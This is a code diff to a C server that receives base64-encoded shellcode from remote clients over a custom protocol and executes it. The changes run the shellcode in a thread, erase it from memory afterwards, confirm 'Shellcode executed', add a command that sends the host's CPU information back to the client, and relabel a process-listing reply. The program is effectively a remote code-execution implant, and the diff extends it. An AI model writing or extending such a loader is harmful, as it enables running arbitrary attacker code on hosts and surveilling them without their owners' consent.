@@ -318,7 +318,7 @@ BOOL EndClientSession(LPCLIENTSTRUCT lpSendingClient) {
   /* Tell the client who told us they want to quit,
    * "Good bye sucka!" */
   lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
-      OK_GOODBYE);
+  OK_GOODBYE);
 
   ClearClientShellCodeLines(lpSendingClient);
 
@@ -434,6 +434,12 @@ BOOL HandleProtocolCommand(LPCLIENTSTRUCT lpSendingClient,
     ProcessPurgCommand(lpSendingClient);
 
     return TRUE; /* command successfully handled */
+  }
+
+  if (Equals(pszBuffer, PROTOCOL_INFO_COMMAND)) {
+    ProcessInfoCommand(lpSendingClient);
+
+    return TRUE;
   }
 
   return FALSE;
@@ -593,16 +599,18 @@ void ProcessCodeCommand(LPCLIENTSTRUCT lpSendingClient,
       GatherShellCodeLine,
       IsMultilineResponseTerminator);
 
-  int total = SumElementsWhere(g_pShellCodeLines,
-      GetCurrentShellCodeInfoBytes,
-      &(lpSendingClient->clientID),
-      FindShellCodeBlockForClient);
+  int nTotalShellCodeBytesReceived =
+      SumElementsWhere(g_pShellCodeLines,
+          GetCurrentShellCodeInfoBytes,
+          &(lpSendingClient->clientID),
+          FindShellCodeBlockForClient);
 
-  if (total == -1 || total != (int) lShellcodeBytes) {
+  if (nTotalShellCodeBytesReceived == -1
+      || nTotalShellCodeBytesReceived != (int) lShellcodeBytes) {
     // Unknown error during computation of total bytes received.
     lpSendingClient->nBytesSent +=
-        ReplyToClient(lpSendingClient, ERROR_GENERAL_SERVER_FAILURE);
-    ClearList(&g_pShellCodeLines, ReleaseShellCodeBlock);
+        ReplyToClient(lpSendingClient, ERROR_CONFIRM_ENCODED_SHELLCODE_BYTES);
+    ClearClientShellCodeLines(lpSendingClient);
     return;
   }
 
@@ -658,7 +666,18 @@ void ProcessExecCommand(LPCLIENTSTRUCT lpSendingClient) {
 
   Base64Decode(pszEncodedShellCode, szDecodedBytes, nDecodedBytes);
 
-  ExecShellCode1(szDecodedBytes, nDecodedBytes);
+  void *pShellCodeBytes = NULL;
+
+  HTHREAD hShellCodeThread =
+      ExecShellCode1Async(szDecodedBytes, nDecodedBytes, &pShellCodeBytes);
+  if (INVALID_HANDLE_VALUE == hShellCodeThread) {
+    lpSendingClient->nBytesSent +=
+        ReplyToClient(lpSendingClient, ERROR_GENERAL_SERVER_FAILURE);
+  }
+
+  WaitThread(hShellCodeThread);
+
+  RemoveShellCodeFromMemory(pShellCodeBytes, nDecodedBytes);
 
   /* Remove all the shellcode blocks for this client from the
    * linked list. This prevents this command from being re-issued
@@ -668,6 +687,9 @@ void ProcessExecCommand(LPCLIENTSTRUCT lpSendingClient) {
       FindShellCodeBlockForClient, ReleaseShellCodeBlock);
 
   FreeBuffer((void**) &pszEncodedShellCode);
+
+  lpSendingClient->nBytesSent +=
+      ReplyToClient(lpSendingClient, "207 OK. Shellcode executed.\n");
 }
 
 ///////////////////////////////////////////////////////////////////////////////
@@ -705,6 +727,49 @@ void ProcessHeloCommand(LPCLIENTSTRUCT lpSendingClient) {
 }
 
 ///////////////////////////////////////////////////////////////////////////////
+// ProcessInfoCommand function
+
+void ProcessInfoCommand(LPCLIENTSTRUCT lpSendingClient) {
+  if (NULL == lpSendingClient) {
+    return;
+  }
+
+  int nFileSize = 0;
+  int nLineCount = 0;
+  char *pszOutputBuffer = NULL;
+
+  ReadAllText(CPUINFO_FILE, &pszOutputBuffer, &nFileSize);
+
+  char** ppszOutputLines = NULL;
+
+  Split(pszOutputBuffer, "\n", &ppszOutputLines, &nLineCount);
+
+  if (ppszOutputLines == NULL || nLineCount <= 0) {
+    lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
+    HOST_OSINFO_ACCESS_DENIED);
+    return;
+  }
+
+  lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
+  OK_CPU_INFO_FOLLOWS);
+
+  for (int i = 0; i < nLineCount; i++) {
+    if (IsNullOrWhiteSpace(ppszOutputLines[i])) {
+      continue; // skip any blank lines
+    }
+
+    lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
+        strcat(ppszOutputLines[i], "\n"));
+  }
+
+  SendMultilineDataTerminator(lpSendingClient);
+
+  /* release the memory occupied by the output */
+  FreeStringArray(&ppszOutputLines, nLineCount);
+  ppszOutputLines = NULL;
+}
+
+///////////////////////////////////////////////////////////////////////////////
 // ProcessListCommand function
 
 void ProcessListCommand(LPCLIENTSTRUCT lpSendingClient) {
@@ -724,7 +789,7 @@ void ProcessListCommand(LPCLIENTSTRUCT lpSendingClient) {
   }
 
   lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
-  OK_LIST_FOLLOWS);
+  OK_PROC_LIST_FOLLOWS);
 
   for (int i = 0; i < nLineCount; i++) {
     lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
@@ -749,7 +814,6 @@ void ProcessPurgCommand(LPCLIENTSTRUCT lpSendingClient) {
   }
   lpSendingClient->nBytesSent +=
       ReplyToClient(lpSendingClient, OK_PURGD_SUCCESSFULLY);
-
 }
 
 ///////////////////////////////////////////////////////////////////////////////
